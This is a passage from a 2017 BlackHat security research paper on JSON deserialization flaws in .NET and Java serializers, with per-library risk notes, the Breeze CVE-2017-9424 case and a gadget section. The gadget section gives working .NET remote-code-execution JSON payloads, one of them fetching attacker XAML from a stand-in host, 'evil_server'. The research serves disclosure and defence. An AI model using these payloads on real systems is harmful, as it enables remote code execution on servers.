FsPickler is a serialization library that facilitates the distribution of objects across .NET processes. The implementation 
focuses on performance and supporting as many types as possible, where possible. It supports multiple, pluggable 
serialization formats such as XML, JSON and BSON; also included is a fast binary format of its own. 
FSPickler will include type discriminators by default so attackers may be able to force the instantiation of arbitrary 
types. However, it performs an expected type graph inspection which will require the attacker to find a member in the 
object graph where the payload can be injected. 
During deserialization, it will call: 
• 
Setters 
• 
Serialization Constructor 
FSPickler should never be used with untrusted data unless expected types are simple and payload injection is not 
possible. This is not a recommended approach since it requires keeping current with published gadgets. 
Sweet.Jayson 
Project Site: https://github.com/ocdogan/Sweet.Jayson 
NuGet Downloads: 1,697 
Fast, reliable, easy to use, fully json.org compliant, thread safe C# JSON library for server side and desktop operations. 
Sweet.Jayson will include type discriminators by default and will perform a weak type control by deserializing the object 
first and then casting it to the expected type. This approach allows an attacker to send payload as the root object in 
Json data. 
6 http://www.newtonsoft.com/json/help/html/SerializeSerializationBinder.htm 
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
During deserialization, it will call: 
• 
Setters 
Sweet.Jayson should never be used with untrusted data since it cannot be configured in a secure way. 
JavascriptSerializer 
Project Site: Native .NET library  
(https://msdn.microsoft.com/en-us/library/system.web.script.serialization.javascriptserializer(v=vs.110).aspx) 
.NET native library that provides serialization and deserialization functionality for AJAX-enabled applications. 
By default, it will not include type discriminator information which makes it a secure serializer. However, a type resolver 
can be configured to include this information. For example: 
JavascriptSerializer jss = new JavascriptSerializer(new 
SimpleTypeResolver()); 
It does not use any type control other than a post-deserialization cast, so payloads can be included as the root Json 
element.  
During deserialization, it will call: 
• 
Setters 
It can be used securely as long as a type resolver is not used or type resolver is configured as one of the whitelisted 
valid types. 
DataContractJsonSerializer 
Project Site: Native .NET library  
(https://msdn.microsoft.com/en-
us/library/system.runtime.serialization.json.datacontractjsonserializer(v=vs.110).aspx) 
.NET native library that serializes objects to the JavaScript Object Notation (JSON) and deserializes JSON data to 
objects. 
DataContractJsonSerializer extends XmlObjectSerializer and it can normally be considered a secure 
serializer since it performs a strict type graph inspection and prevents deserialization of non-whitelisted types. 
However, we found that if an attacker can control the expected type used to configure the deserializer, he/she will be 
able to execute code. 
var typename = cookie["typename"]; 
… 
var serializer = new 
DataContractJsonSerializer(Type.GetType(typename)); 
var obj = serializer.ReadObject(ms); 
During deserialization, it will call: 
• 
Setters 
• 
Serialization Constructors 
DataContractSerializer can be used securely as long as the expected type cannot be controlled by users. 
Jackson 
Project site: https://github.com/FasterXML/jackson 
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
Jackson is probably the most popular JSON library for Java. 
By default, it does not include any type information along the serialized data, however since this is necessary to 
serialize polymorphic types and System.lang.Object instances, it defines a way to include type discriminators by using 
a global setting or per field annotation. 
It can be globally enabled by calling enableDefaultTyping on the object mapper: 
// default to using DefaultTyping.OBJECT_AND_NON_CONCRETE 
objectMapper.enableDefaultTyping();  
The following typings are possible: 
• 
JAVA_LANG_OBJECT: only affects properties of type Object.class 
• 
OBJECT_AND_NON_CONCRETE: affects Object.class and all non-concrete types (abstract classes, 
interfaces) 
• 
NON_CONCRETE_AND_ARRAYS: same as above, and all array types of the same (direct elements are 
non-concrete types or Object.class) 
• 
NON_FINAL: affects all types that are not declared 'final', and array types of non-final element types. 
It can also be enabled for a specific class field by annotating it with @JsonType: 
@JsonTypeInfo(use=JsonTypeInfo.Id.CLASS, 
include=JsonTypeInfo.As.PROPERTY, property="@class") 
public Object message; 
As with Json.Net, if type discriminators are enabled, attackers will be able to inject their payloads on any member in 
the expected object graph which is can be assigned the gadget type. 
Upon deserialization, the following methods will be invoked: 
• 
Setters 
When dealing with untrusted data, the best option is to never enable type information. If it is required, do it by using 
the @JsonTypeInfo annotation only for the required fields and using JsonTypeInfo.Id other than CLASS as its 
"use" value. 
Genson  
Project site: https://owlike.github.io/genson/ 
Genson is a Java and Scala JSON conversion library. 
As in Jackson, the serializer will not include the type information by default, but it can be configured to do so by calling 
useRuntimeType() on the mapper builder. In the other hand Genson does an inspection of the expected object 
graph to control which classes can be deserialized. Therefore, an attacker needs to find an injection field in the object 
graph. 
Genson will call the following methods upon deserialization: 
• 
Setters 
When dealing with untrusted data, Genson should never be configured to use runtime types. 
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
JSON-IO 
Project site: https://github.com/jdereg/json-io 
Json-io is a light JSON parser which by default includes type information on the produced JSON. It does not implement 
any type controls other than casting to the expected type. An attacker may be able to inject payload as the root element 
of the JSON body. 
Json-io will use reflection to assign field values and therefore, it will not invoke any setters during deserialization 
process. However, we found that it is still vulnerable since it will call the toString() method of the deserialized class 
if an exception is raised. An attacker will be able to force json-io to create an instance of a desired class, populate any 
field using reflection with attacker controlled data and then add an incorrect value for some field which will trigger an 
exception. Consequently, Json-io will call the toString() method on the deserialized object. 
Methods called upon deserialization: 
• 
toString() 
Json-io should never be used with untrusted data. 
FlexSON 
Project site: http://flexjson.sourceforge.net/ 
Flexjson is a lightweight library for serializing and deserializing Java objects into and from JSON. 
It includes type discriminators in the serialized JSON data by default and it does not implement any type control. This 
allows attackers to easily attack this parser. 
Upon deserialization it will call: 
• 
Setters 
It should never be used with untrusted data. 
Finding entry points in object graphs 
Some libraries perform type control by inspecting expected type object graph and only allowing types that are 
assignable to expected field types. When that is the case, an attacker needs to find an entry point to place payload 
gadget. Depending on the object graph, this may or may not be possible. The following are some tips we used to find 
those entry points in the target object graph. 
• 
.NET non-generic collections such as Hashtable, Arraylist, etc. 
• 
Object member (java.lang.Object or System.Object) 
• 
Generic types (eg: Message) 
In addition, attackers can extend the surface of this search: 
• 
Use a derived type of expected member type 
o 
Java example: Field type is java.lang.Exception, derived type 
javax.management.InvalidApplicationException can be used which has a 
java.lang.Object field that can be used to place any payload gadget. 
o 
.NET example: Property type is System.Exception, 
System.ComponentModel.DataAnnotations.ValidationException can be used which 
has a System.Object property that can be used to place any payload gadget. 
• 
Use property of parent type 
Any of these actions can be done recursively for any type from the expected type graph 
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
Example: Breeze (CVE-2017-9424) 
Breeze (http://www.getbreezenow.com/) is a .NET data management backend framework which allows developers to 
write data management endpoints for Javascript and .NET clients. Communication is done over HTTP/JSON and uses 
Json.Net as parsing library.  
The project was configured to use TypeNameHandling.All and therefore it will include the .NET type details in the 
exchanged Json data. An attacker could modify this type information and force the backend to deserialize arbitrary 
types and therefore calling setters on arbitrary types.  
An attacker was able to inject its payload in the Tag property of the expected SaveOptions type: 
public class SaveOptions { 
    public bool AllowConcurrentSaves { get; set; } 
    public Object Tag { get; set; } 
} 
This vulnerability affected all users of breeze framework regardless of their configuration or exposed endpoints. 
Report Timeline 
Issue was reported on May 29th 
Vulnerability was fixed in version 1.6.5 which was released on June 1st 7 (Just 2 days!) 
Gadgets 
The following section is a summary of the setter gadgets we found and used to attack analyzed libraries. 
.NET RCE Gadgets 
System.Configuration.Install.AssemblyInstaller 
Sample JSON payload: 
{"$type":"System.Configuration.Install.AssemblyInstaller, 
System.Configuration.Install, Version=4.0.0.0, Culture=neutral, 
PublicKeyToken=b03f5f7f11d50a3a", 
"Path":"file:///c:/somePath/MixedLibrary.dll"} 
Source code: 
// System.Configuration.Install.AssemblyInstaller 
public void set_Path(string value) 
{ 
if (value == null) 
{ 
this.assembly = null; 
} 
this.assembly = Assembly.LoadFrom(value); 
} 
Attack vector:  
Execute payload on assembly load. There can be used 2 ways for RCE: 
• 
We can put our code in DllMain() function of Mixed Assembly 8 
7 http://breeze.github.io/doc-net/release-notes.html 
8 https://blog.cylance.com/implications-of-loading-net-assemblies  
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
• 
We can put our code in static constructor of own Type derived from 
System.Configuration.Install.Installer and annotated as 
[RunInstallerAttribute(true)] 9. In this case we will need to call InitializeFromAssembly(). It 
can be done using the HelpText getter. 
Requirements: 
There is no additional requirement if assembly with payload is on the local machine but in case of remote resources, 
newer .Net Framework versions may have some additional security checks.  
System.Activities.Presentation.WorkflowDesigner 
Sample JSON payload: 
{"$type":"System.Activities.Presentation.WorkflowDesigner, 
System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, 
PublicKeyToken=31bf3856ad364e35", 
"PropertyInspectorFontAndColorData":" 
            calc 
" 
} 
Source code: 
// System.Activities.Presentation.WorkflowDesigner 
public void set_PropertyInspectorFontAndColorData(string value) 
{ 
StringReader input = new StringReader(value); 
XmlReader reader = XmlReader.Create(input); 
Hashtable hashtable = (Hashtable)XamlReader.Load(reader); 
… 
Attack vector:  
Execute static method during parsing of Xaml payload.  
9 https://msdn.microsoft.com/en-us/library/system.componentmodel.runinstallerattribute(v=vs.110).aspx  
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
Requirements: 
Constructor of this Type requires Single-Threaded-Apartment (STA) thread 
System.Windows.ResourceDictionary 
Sample JSON payload: 
{"__type":"System.Windows.Application, PresentationFramework, 
Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35", 
"Resources":{"__type":"System.Windows.ResourceDictionary, 
PresentationFramework, Version=4.0.0.0, Culture=neutral, 
PublicKeyToken=31bf3856ad364e35", 
"Source":"http://evil_server/EvilSite/Xamlpayload"}} 
Source code: 
// System.Windows.ResourceDictionary 
public void set_Source(Uri value) 
{ 
    ... 
    this._source = value; 
    this.Clear(); 
    Uri resolvedUri = BindUriHelper.GetResolvedUri(this._baseUri, 
this._source); 
    WebRequest request = 
WpfWebRequestHelper.CreateRequest(resolvedUri); 
    ... 
    Stream s = null; 
    try 
    { 
s = WpfWebRequestHelper.GetResponseStream(request, out 
contentType); 
    } 
... 
    XamlReader xamlReader; 
    ResourceDictionary resourceDictionary = 
MimeObjectFactory.GetObjectAndCloseStream(s, contentType, 
resolvedUri, false, false, false, false, out xamlReader) as 
ResourceDictionary; 
... 
// MS.Internal.AppModel.MimeObjectFactory 
internal static object GetObjectAndCloseStream(Stream s, ContentType 
contentType, Uri baseUri, bool canUseTopLevelBrowser, bool 
sandboxExternalContent, bool allowAsync, bool isJournalNavigation, 
out XamlReader asyncObjectConverter) 
{ 
    object result = null; 
    asyncObjectConverter = null; 
    StreamToObjectFactoryDelegate streamToObjectFactoryDelegate; 
  BlackHat Conference July 2017 
HPE Software Security Research Paper 
    if (contentType != null &&         
MimeObjectFactory._objectConverters.TryGetValue(contentType, out 
streamToObjectFactoryDelegate)) 
{ 
result = streamToObjectFactoryDelegate(s, baseUri, 
canUseTopLevelBrowser, sandboxExternalContent, allowAsync, 
isJournalNavigation, out asyncObjectConverter); 
... 
Static constructor of System.Windows.Application type initializes _objectConverters: 
// System.Windows.Application 
static Application() 
{ 
... 
Application.ApplicationInit();... 
// System.Windows.Application 
private static void ApplicationInit() 
{ 
... 
StreamToObjectFactoryDelegate method = new 
StreamToObjectFactoryDelegate(AppModelKnownContentFactory.XamlConver
ter); 
MimeObjectFactory.Register(MimeTypeMapper.XamlMime, method); 
...... 
Code of XamlConverter: 
// MS.Internal.AppModel.AppModelKnownContentFactory 
internal static object XamlConverter(Stream stream, Uri baseUri, 
bool canUseTopLevelBrowser, bool sandboxExternalContent, bool 
allowAsync, bool isJournalNavigation, out XamlReader 
asyncObjectConverter) 
{ 
... 
if (allowAsync) 
{ 
XamlReader xamlReader = new XamlReader(); 
asyncObjectConverter = xamlReader; 
xamlReader.LoadCompleted += new 
AsyncCompletedEventHandler(AppModelKnownContentFactory.OnParserCompl
ete); 
return xamlReader.LoadAsync(stream, parserContext); 
} 
return XamlReader.Load(stream, parserContext); 
} 
Attack vector:  
An attacker sends payload with URL to controlled server, this server responds with Xaml payload and Content 
Type = application/xaml+xml and target server will execute desired static method during parsing of Xaml 